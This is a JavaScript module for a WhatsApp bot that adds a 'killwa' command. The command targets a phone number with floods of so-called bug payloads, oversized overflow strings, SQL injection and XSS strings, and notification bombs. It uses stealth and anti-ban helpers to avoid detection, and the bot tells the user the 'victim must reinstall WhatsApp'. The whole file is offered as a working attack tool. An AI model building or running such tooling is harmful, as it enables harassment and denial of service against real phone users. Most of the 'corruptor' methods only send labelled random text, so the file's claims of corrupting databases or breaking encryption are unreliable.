'use strict';

const crypto = require('crypto');
const AntiDetection = require('./antiDetection');
const BanProtection = require('./banProtection');
const { BOT_NAME, PREFIX } = require('../config');

class WhatsAppKiller {
    constructor() {
        this.sock = null;
        this.stealth = new AntiDetection();
        this.banProtection = new BanProtection();
        this.activeAttacks = new Map();
        this.attackStats = new Map();

        this.crashVectors = [
            this.sendMalformedMessage.bind(this),
            this.sendOverflowPayload.bind(this),
            this.sendCorruptMedia.bind(this),
            this.sendInvalidLink.bind(this),
            this.sendSQLInjection.bind(this),
            this.sendXSSPayload.bind(this),
            this.sendInfiniteLoopPayload.bind(this),
            this.sendRecursionPayload.bind(this),
            this.sendMemoryLeakPayload.bind(this),
            this.sendNotificationBomb.bind(this)
        ];

        this.bugPayloads = [
            this.sendDatabaseCorruptor.bind(this),
            this.sendCacheCorruptor.bind(this),
            this.sendMediaCorruptor.bind(this),
            this.sendConfigCorruptor.bind(this),
            this.sendEncryptionBreaker.bind(this),
            this.sendStorageExploit.bind(this),
            this.sendMemoryExploit.bind(this),
            this.sendFileSystemCorruptor.bind(this),
            this.sendBackupCorruptor.bind(this),
            this.sendSessionKiller.bind(this),
            this.sendNotificationExploit.bind(this),
            this.sendContactCorruptor.bind(this),
            this.sendMessageCorruptor.bind(this),
            this.sendSyncBreaker.bind(this),
            this.sendDatabaseLock.bind(this)
        ];
    }

    async execute(sock, msg, args, ctx) {
        this.sock = sock;
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  WHATSAPP KILLER USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}killwa <phone> [method] [duration]`,
                    `║`,
                    `║ 🐛 *BUG INJECTION METHODS*`,
                    `║ ▸ bug        – All bugs (recommended)`,
                    `║ ▸ database   – Corrupt database`,
                    `║ ▸ cache      – Corrupt cache`,
                    `║ ▸ media      – Corrupt media`,
                    `║ ▸ config     – Corrupt config`,
                    `║ ▸ encryption – Break encryption`,
                    `║ ▸ storage    – Storage exploit`,
                    `║ ▸ memory     – Memory exploit`,
                    `║ ▸ filesystem – Corrupt file system`,
                    `║ ▸ backup     – Corrupt backups`,
                    `║ ▸ session    – Kill session`,
                    `║ ▸ notification – Notification exploit`,
                    `║ ▸ contact    – Corrupt contacts`,
                    `║ ▸ message    – Corrupt messages`,
                    `║ ▸ sync       – Break sync`,
                    `║ ▸ dblock     – Lock database`,
                    `║`,
                    `║ ▸ Example: ${PREFIX}killwa 2547XXXXXX bug 30`,
                    `║`,
                    `║ ⚠️ VICTIM MUST REINSTALL WHATSAPP`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const phone = args[0].replace(/[^0-9]/g, '');
        const method = args[1] || 'bug';
        const duration = parseInt(args[2]) || 30;

        if (!this.validatePhone(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ERROR  〕`,
                    `║`,
                    `║ ▸ Invalid phone: ${phone}`,
                    `║ ▸ Use format: CountryCode + Number`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        if (this.banProtection.isBanned(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  BLOCKED  〕`,
                    `║`,
                    `║ ▸ ${phone} is blacklisted.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        if (this.banProtection.isWhitelisted(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  PROTECTED  〕`,
                    `║`,
                    `║ ▸ ${phone} is whitelisted.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        const risk = this.stealth.getBanRisk(phone);
        if (risk >= 5) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  HIGH BAN RISK  〕`,
                    `║`,
                    `║ ▸ Risk: ${risk}/10`,
                    `║ ▸ Attack blocked.`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        if (this.activeAttacks.has(phone)) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ALREADY RUNNING  〕`,
                    `║`,
                    `║ ▸ Attack already on ${phone}`,
                    `║ ▸ Use ${PREFIX}killwa_stop ${phone} to stop`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }

        this.activeAttacks.set(phone, { active: true, method, duration, startTime: Date.now() });
        this.trackAttack(phone, 'killwa');

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  BUG INJECTION INITIATED  〕`,
                `║`,
                `║ ▸ Target  : ${phone}`,
                `║ ▸ Method  : ${method}`,
                `║ ▸ Duration: ${duration}s`,
                `║ ▸ Ban Risk: ${risk}/10`,
                `║`,
                `║ ⚠️ VICTIM WILL NEED TO REINSTALL`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });

        let result;
        try {
            await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
            result = await this.executeBugInjection(phone, method, duration);
            this.updateAttackStats(phone, 'killwa', 1);
        } catch (err) {
            console.error('Bug injection error:', err);
            this.stealth.increaseBanRisk(phone, 2);
            result = { success: false, error: err.message };
        } finally {
            this.activeAttacks.delete(phone);
        }

        await sock.sendMessage(ctx.from, {
            text: [
                `╔═|〔  BUG INJECTION COMPLETE  〕`,
                `║`,
                `║ ▸ Target   : ${phone}`,
                `║ ▸ Status   : ${result.success ? '✅ INJECTED' : '❌ FAILED'}`,
                `║ ▸ Impact   : ${result.impact || 'Unknown'}`,
                `║ ▸ Details  : ${result.details || 'No details'}`,
                `║ ▸ Risk Level: ${this.stealth.getBanRisk(phone)}/10`,
                `║`,
                `║ ⚠️ VICTIM MUST REINSTALL WHATSAPP`,
                `╚═|〔  ${BOT_NAME}  〕`
            ].join('\n')
        }, { quoted: msg });
    }

    validatePhone(phone) {
        return phone.length >= 10 && phone.length <= 15 && /^[0-9]+$/.test(phone);
    }

    async executeBugInjection(phone, method, duration) {
        const methods = {
            'bug': this.injectAllBugs.bind(this),
            'database': this.sendDatabaseCorruptor.bind(this),
            'cache': this.sendCacheCorruptor.bind(this),
            'media': this.sendMediaCorruptor.bind(this),
            'config': this.sendConfigCorruptor.bind(this),
            'encryption': this.sendEncryptionBreaker.bind(this),
            'storage': this.sendStorageExploit.bind(this),
            'memory': this.sendMemoryExploit.bind(this),
            'filesystem': this.sendFileSystemCorruptor.bind(this),
            'backup': this.sendBackupCorruptor.bind(this),
            'session': this.sendSessionKiller.bind(this),
            'notification': this.sendNotificationExploit.bind(this),
            'contact': this.sendContactCorruptor.bind(this),
            'message': this.sendMessageCorruptor.bind(this),
            'sync': this.sendSyncBreaker.bind(this),
            'dblock': this.sendDatabaseLock.bind(this)
        };
        if (methods[method]) return await methods[method](phone, duration);
        return await this.injectAllBugs(phone, duration);
    }

    async sendWhatsAppMessage(phone, message) {
        try {
            if (this.stealth.getBanRisk(phone) >= 5) return false;
            const result = await this.stealth.sendStealthMessage(this.sock, phone, message, {
                simulateTyping: true,
                randomDelay: true,
                useNaturalTemplate: true,
                trackRateLimit: true,
                addEmoji: true,
                simulateRead: true,
                autoCleanup: true,
                cleanupDelay: 5000,
                encryptMessage: true,
                encryptionMethod: 'aes'
            });
            return result.success;
        } catch (e) {
            console.error('[Kill] Send failed:', e.message);
            this.stealth.increaseBanRisk(phone, 0.5);
            return false;
        }
    }

    // ----- All bug payload methods (unchanged) -----
    async injectAllBugs(phone, duration) {
        let successCount = 0, totalAttempts = 0;
        const startTime = Date.now();
        for (const bugMethod of this.bugPayloads) {
            if (!this.activeAttacks.get(phone)?.active) break;
            if (this.stealth.getBanRisk(phone) >= 5) break;
            if (Date.now() - startTime > duration * 1000) break;
            try {
                const result = await bugMethod(phone);
                totalAttempts++;
                if (result) successCount++;
                await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
            } catch (e) {}
        }
        return {
            success: successCount > 0,
            impact: 'WhatsApp Corrupted - Reinstall Required',
            details: `${successCount}/${totalAttempts} bug payloads injected successfully`
        };
    }

    async sendDatabaseCorruptor(phone) {
        try {
            const payloads = ['msgstore.db.corrupt', 'wa.db.corrupt', 'chats.db.corrupt', 'contacts.db.corrupt', 'messages.db.corrupt', 'settings.db.corrupt', 'calls.db.corrupt', 'status.db.corrupt', 'media.db.corrupt', 'backup.db.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 DATABASE_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(200 + Math.random() * 300);
            }
            await this.sendWhatsAppMessage(phone, `💀 DATABASE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendCacheCorruptor(phone) {
        try {
            const payloads = ['cache.corrupt', 'thumbnails.corrupt', 'previews.corrupt', 'avatars.corrupt', 'stickers.corrupt', 'gifs.corrupt', 'images.corrupt', 'videos.corrupt', 'audio.corrupt', 'documents.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 CACHE_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(150 + Math.random() * 250);
            }
            await this.sendWhatsAppMessage(phone, `💀 CACHE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendMediaCorruptor(phone) {
        try {
            const payloads = ['media.corrupt', 'images.corrupt', 'videos.corrupt', 'audio.corrupt', 'documents.corrupt', 'voice.corrupt', 'video_notes.corrupt', 'profile_pics.corrupt', 'group_icons.corrupt', 'status_media.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 MEDIA_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(250 + Math.random() * 350);
            }
            await this.sendWhatsAppMessage(phone, `💀 MEDIA_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendConfigCorruptor(phone) {
        try {
            const payloads = ['config.corrupt', 'settings.corrupt', 'preferences.corrupt', 'notifications.corrupt', 'privacy.corrupt', 'security.corrupt', 'backup.corrupt', 'storage.corrupt', 'network.corrupt', 'language.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 CONFIG_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(180 + Math.random() * 280);
            }
            await this.sendWhatsAppMessage(phone, `💀 CONFIG_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendEncryptionBreaker(phone) {
        try {
            const payloads = ['key.corrupt', 'cipher.corrupt', 'hash.corrupt', 'salt.corrupt', 'iv.corrupt', 'mac.corrupt', 'signature.corrupt', 'cert.corrupt', 'token.corrupt', 'session_key.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 ENCRYPTION_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(200 + Math.random() * 300);
            }
            await this.sendWhatsAppMessage(phone, `💀 ENCRYPTION_BREAK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendStorageExploit(phone) {
        try {
            const payloads = ['storage.corrupt', 'partition.corrupt', 'allocator.corrupt', 'block.corrupt', 'inode.corrupt', 'journal.corrupt', 'superblock.corrupt', 'bitmap.corrupt', 'extent.corrupt', 'volume.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 STORAGE_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(220 + Math.random() * 320);
            }
            await this.sendWhatsAppMessage(phone, `💀 STORAGE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendMemoryExploit(phone) {
        try {
            const payloads = ['heap.corrupt', 'stack.corrupt', 'buffer.corrupt', 'allocator.corrupt', 'pool.corrupt', 'cache.corrupt', 'page.corrupt', 'segment.corrupt', 'region.corrupt', 'arena.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 MEMORY_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(160 + Math.random() * 260);
            }
            await this.sendWhatsAppMessage(phone, `💀 MEMORY_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendFileSystemCorruptor(phone) {
        try {
            const payloads = ['filesystem.corrupt', 'directory.corrupt', 'file.corrupt', 'link.corrupt', 'mount.corrupt', 'fstab.corrupt', 'mnt.corrupt', 'dev.corrupt', 'proc.corrupt', 'sys.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 FILESYSTEM_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(190 + Math.random() * 290);
            }
            await this.sendWhatsAppMessage(phone, `💀 FILESYSTEM_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendBackupCorruptor(phone) {
        try {
            const payloads = ['backup.corrupt', 'restore.corrupt', 'archive.corrupt', 'zip.corrupt', 'tar.corrupt', 'gzip.corrupt', 'bzip.corrupt', 'xz.corrupt', '7z.corrupt', 'rar.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 BACKUP_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(230 + Math.random() * 330);
            }
            await this.sendWhatsAppMessage(phone, `💀 BACKUP_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendSessionKiller(phone) {
        try {
            const payloads = ['session.corrupt', 'token.corrupt', 'auth.corrupt', 'login.corrupt', 'logout.force', 'reset.force', 'clear.force', 'wipe.force', 'kill.force', 'terminate.force'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 SESSION_KILL:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(170 + Math.random() * 270);
            }
            await this.sendWhatsAppMessage(phone, `💀 SESSION_TERMINATE:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendNotificationExploit(phone) {
        try {
            const payloads = ['notif.corrupt', 'alert.corrupt', 'push.corrupt', 'badge.corrupt', 'sound.corrupt', 'vibrate.corrupt', 'led.corrupt', 'popup.corrupt', 'toast.corrupt', 'banner.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 NOTIFICATION_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(140 + Math.random() * 240);
            }
            await this.sendWhatsAppMessage(phone, `💀 NOTIFICATION_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendContactCorruptor(phone) {
        try {
            const payloads = ['contacts.corrupt', 'addressbook.corrupt', 'phonebook.corrupt', 'profile.corrupt', 'avatar.corrupt', 'name.corrupt', 'number.corrupt', 'email.corrupt', 'group.corrupt', 'broadcast.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 CONTACT_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(210 + Math.random() * 310);
            }
            await this.sendWhatsAppMessage(phone, `💀 CONTACT_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendMessageCorruptor(phone) {
        try {
            const payloads = ['messages.corrupt', 'chat.corrupt', 'conversation.corrupt', 'text.corrupt', 'media.corrupt', 'location.corrupt', 'contact.corrupt', 'document.corrupt', 'voice.corrupt', 'video.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 MESSAGE_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(175 + Math.random() * 275);
            }
            await this.sendWhatsAppMessage(phone, `💀 MESSAGE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendSyncBreaker(phone) {
        try {
            const payloads = ['sync.corrupt', 'cloud.corrupt', 'backup.corrupt', 'restore.corrupt', 'merge.corrupt', 'conflict.corrupt', 'version.corrupt', 'timestamp.corrupt', 'checksum.corrupt', 'manifest.corrupt'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 SYNC_CORRUPT:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(195 + Math.random() * 295);
            }
            await this.sendWhatsAppMessage(phone, `💀 SYNC_BREAK:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    async sendDatabaseLock(phone) {
        try {
            const payloads = ['lock.db', 'lock.wa', 'lock.chats', 'lock.contacts', 'lock.messages', 'lock.settings', 'lock.calls', 'lock.status', 'lock.media', 'lock.backup'];
            for (const p of payloads) {
                await this.sendWhatsAppMessage(phone, `🐛 DATABASE_LOCK:${p}:${crypto.randomBytes(32).toString('hex')}`);
                await this.stealth.sleep(250 + Math.random() * 350);
            }
            await this.sendWhatsAppMessage(phone, `💀 DATABASE_LOCK_FINAL:${crypto.randomBytes(64).toString('hex')}`);
            return true;
        } catch (e) { return false; }
    }

    // ----- Crash vectors (kept for compatibility) -----
    async sendMalformedMessage(phone) {
        try {
            const malformedData = 'A'.repeat(50000) + crypto.randomBytes(500).toString('hex');
            return await this.sendWhatsAppMessage(phone, malformedData);
        } catch (e) { return false; }
    }

    async sendOverflowPayload(phone) {
        try {
            const overflow = 'X'.repeat(250000);
            return await this.sendWhatsAppMessage(phone, overflow);
        } catch (e) { return false; }
    }

    async sendCorruptMedia(phone) {
        try {
            const corruptData = Buffer.from([0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF]).toString('base64');
            return await this.sendWhatsAppMessage(phone, '📷 ' + corruptData.substring(0, 500));
        } catch (e) { return false; }
    }

    async sendInvalidLink(phone) {
        try {
            const link = 'whatsapp://' + 'a'.repeat(25000);
            return await this.sendWhatsAppMessage(phone, link);
        } catch (e) { return false; }
    }

    async sendSQLInjection(phone) {
        try {
            const sql = "' OR '1'='1' -- " + 'A'.repeat(2500);
            return await this.sendWhatsAppMessage(phone, sql);
        } catch (e) { return false; }
    }

    async sendXSSPayload(phone) {
        try {
            const xss = '<script>alert(1)</script>' + 'A'.repeat(2500);
            return await this.sendWhatsAppMessage(phone, xss);
        } catch (e) { return false; }
    }

    async sendInfiniteLoopPayload(phone) {
        try {
            const payload = 'while(true){' + 'A'.repeat(5000) + '}';
            return await this.sendWhatsAppMessage(phone, payload);
        } catch (e) { return false; }
    }

    async sendRecursionPayload(phone) {
        try {
            const payload = 'function x(){x();}' + 'A'.repeat(5000);
            return await this.sendWhatsAppMessage(phone, payload);
        } catch (e) { return false; }
    }

    async sendMemoryLeakPayload(phone) {
        try {
            const payload = 'var leak=[];while(true){leak.push("A".repeat(5000))}' + 'A'.repeat(5000);
            return await this.sendWhatsAppMessage(phone, payload);
        } catch (e) { return false; }
    }

    async sendNotificationBomb(phone) {
        try {
            const messages = [];
            for (let i = 0; i < 5; i++) {
                messages.push(`🔔 Notification ${i+1} - ${crypto.randomBytes(4).toString('hex')}`);
            }
            const results = await this.stealth.sendStealthBatch(this.sock, phone, messages, {
                delayBetween: this.stealth.getNaturalDelay('message'),
                randomSpread: true,
                maxPerBatch: 5
            });
            return results.some(r => r.success);
        } catch (e) { return false; }
    }

    trackAttack(phone, type) {
        if (!this.attackStats.has(phone)) {
            this.attackStats.set(phone, { killwa: 0, lastAttack: null });
        }
        const stats = this.attackStats.get(phone);
        stats[type] = (stats[type] || 0) + 1;
        stats.lastAttack = Date.now();
        this.attackStats.set(phone, stats);
        if (stats.killwa > 10) {
            this.banProtection.addToBlacklist(phone, 'Too many killwa attacks');
        }
    }

    updateAttackStats(phone, type, count) {
        if (!this.attackStats.has(phone)) {
            this.trackAttack(phone, type);
        }
        const stats = this.attackStats.get(phone);
        stats[type] = (stats[type] || 0) + count;
        this.attackStats.set(phone, stats);
    }
}

// ============================================
// STOP COMMAND
// ============================================
class WhatsAppKillerStop {
    constructor(killer) {
        this.killer = killer;
        this.name = 'killwa_stop';
        this.description = 'Stop WhatsApp killer attack';
        this.category = 'exploit';
    }

    async execute(sock, msg, args, ctx) {
        if (args.length < 1) {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  STOP ATTACK USAGE  〕`,
                    `║`,
                    `║ ▸ ${PREFIX}killwa_stop <phone>`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
            return;
        }
        const phone = args[0].replace(/[^0-9]/g, '');
        if (this.killer.activeAttacks.has(phone)) {
            this.killer.activeAttacks.delete(phone);
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ATTACK STOPPED  〕`,
                    `║`,
                    `║ ▸ Phone: ${phone}`,
                    `║ ▸ Status: ✅ Stopped`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
        } else {
            await sock.sendMessage(ctx.from, {
                text: [
                    `╔═|〔  ATTACK STOPPED  〕`,
                    `║`,
                    `║ ▸ Phone: ${phone}`,
                    `║ ▸ Status: ❌ No active attack`,
                    `╚═|〔  ${BOT_NAME}  〕`
                ].join('\n')
            }, { quoted: msg });
        }
    }
}

module.exports = { WhatsAppKiller, WhatsAppKillerStop };
